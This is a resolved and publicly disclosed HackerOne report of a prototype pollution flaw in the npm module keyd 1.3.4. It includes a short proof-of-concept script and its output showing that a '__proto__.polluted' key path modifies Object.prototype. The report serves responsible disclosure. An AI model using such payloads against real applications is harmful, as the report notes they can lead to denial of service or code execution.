---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/modification-of-assumed-immutable-data-maid
  - env/web
  - stack/node
  - vuln/code-injection
  - vuln/dos
  - impact/rce
substate: "resolved"
weakness: "Modification of Assumed-Immutable Data (MAID)"
enriched: true
body: true
date: 2020-09-14
submitted: 2020-05-18T19:58:29.357Z
bounty_usd: null
votes: 1
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/877515"
title: "[keyd] Prototype pollution"
---
# [keyd] Prototype pollution

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 1 | **Program:** Node.js third-party modules | **Disclosed:** 2020-09-14

- Report: [https://hackerone.com/reports/877515](https://hackerone.com/reports/877515)
- CWE: Modification of Assumed-Immutable Data (MAID)
- Submitted: 2020-05-18T19:58:29.357Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `prototype pollution` vulnerability in `keyd` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `keyd`
**version:** `1.3.4`
**npm page:** `https://www.npmjs.com/package/keyd`

## Module Description

A small library for using and manipulating key paths in JavaScript.

## Module Stats

[71] weekly downloads

# Vulnerability

## Vulnerability Description

The `set` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `keyd` module:
    - `npm i keyd`

Set the `__proto__.polluted` property of an object:
```javascript

const keyd = require('keyd');
const obj = {};
console.log("Before : " + obj.polluted);
keyd({}).set('__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F833532}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Timeline

- **Report Filed**
- **2020-05-18** @nochnoidozor: Hi @d3lla,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
